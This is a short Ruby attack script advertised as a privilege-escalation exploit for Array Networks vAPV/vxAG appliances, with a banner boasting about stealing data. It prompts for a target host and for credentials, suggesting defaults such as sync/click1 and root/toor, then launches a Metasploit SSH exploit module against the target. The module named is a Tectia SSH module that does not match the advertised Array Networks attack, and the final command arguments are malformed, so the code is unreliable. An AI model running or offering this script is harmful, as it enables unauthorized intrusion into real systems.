puts """

 	  Th3 M4d_Sc13nT15t is here to stay...
         Im coming coming to steal your data...

      Array Networks vAPV and vxAG Private Key
	    Privilege Escalation Code Execution

	 	vAPV 8.3.2.17 / vxAG 9.2.0.34

       		 Starting Port:: 22   

"""

puts " [?] What is the target? "
print "[!] ---> "

target = gets.chomp

puts " [?] What is the Port ? [Start with 22]  "
print "[!] ---> "

port = gets.chomp

puts " [?] What is the Username? [sync] or maybe [root, toor] "
print "[!] ---> "

name = gets.chomp

puts " [?] What is the Password? [click1] or maybe [root, toor] "
print "[!] ---> "

pass = gets.chomp

exec("msfconsole -x 'use exploit/unix/ssh/tectia_passwd_changereq' -x 'setg RHOST #{target}' -x 'setg RPORT #{port}' -x 'set USER #{name}' -x 'set PASS #{pass}' -x 'run' 'run'")
